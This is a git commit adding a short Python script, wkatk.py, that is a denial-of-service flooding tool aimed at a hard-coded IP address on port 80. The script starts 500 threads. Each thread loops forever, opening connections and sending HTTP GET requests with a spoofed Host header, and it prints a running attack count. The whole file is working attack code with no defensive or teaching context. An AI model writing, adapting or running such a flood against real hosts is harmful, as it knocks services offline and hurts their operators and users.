644728615898edfb517949ebae4baee472784d7e
Moment-ag <67823105+Moment-ag@users.noreply.github.com>
2020-07-08 22:17:48 +0700

    Create wkatk.py

---
+++ wkatk.py
@@ -0,0 +1,24 @@
+import socket
+import threading
+target = '101.109.41.50'
+fake_ip = '212.103.49.141'
+port = 80
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
